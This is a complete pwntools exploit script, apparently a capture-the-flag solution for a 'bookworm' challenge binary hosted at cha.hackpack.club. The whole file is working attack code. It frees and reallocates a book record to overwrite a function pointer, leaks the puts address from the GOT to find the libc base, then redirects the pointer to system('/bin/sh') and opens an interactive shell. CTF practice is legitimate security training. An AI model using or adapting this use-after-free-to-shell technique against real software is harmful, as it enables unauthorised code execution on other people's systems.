#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./bookworm')
libc = ELF("./libc.so.6")

host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41720)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start(env={"LD_PRELOAD": "./libc.so.6"})

def create_book(name_size, name, summary_size, summary):
    io.sendline("1")
    io.recvuntil("Enter book name size: ")
    io.sendline(str(name_size))

    io.recvuntil("Enter book name: ")
    io.send(name)

    io.recvuntil("Enter book summary size: ")
    io.sendline(str(summary_size))

    io.recvuntil("Enter book summary: ")
    io.send(summary)

    io.recvuntil(">> ")

def delete_book(book_id):
    io.sendline("2")
    io.recvuntil("Select Book ID (0-10): ")
    io.sendline(str(book_id))
    
    io.recvuntil(">> ")

def read_book_summary(book_id):
    io.sendline("4")
    io.recvuntil("Select Book ID (0-10): ")
    io.sendline(str(book_id))
    data = io.recvuntil(">> ")
    return data

io.recvuntil(">> ")

create_book(23, "AAAAAAAA", 10, "BBBBBBBB")
delete_book(0)

payload = (
    p64(exe.plt["puts"]) +
    b"D" * 8 +
    p64(exe.got["puts"])
)

create_book(23, payload[:23], 10, "FFFFFFFF")

data = read_book_summary(0)
leak = u64(data[:6].ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)

create_book(23, "HHHHHHHHH", 10, "IIIIIIII")
delete_book(2)

payload = (
    p64(libc.sym.system) +
    b"W" * 8 +
    p64(next(libc.search(b"/bin/sh")))
)
create_book(23, payload[:23], 10, "FFFFFFFF")

io.sendline("4")
io.recvuntil("Select Book ID (0-10): ")
io.sendline("2")

io.interactive()
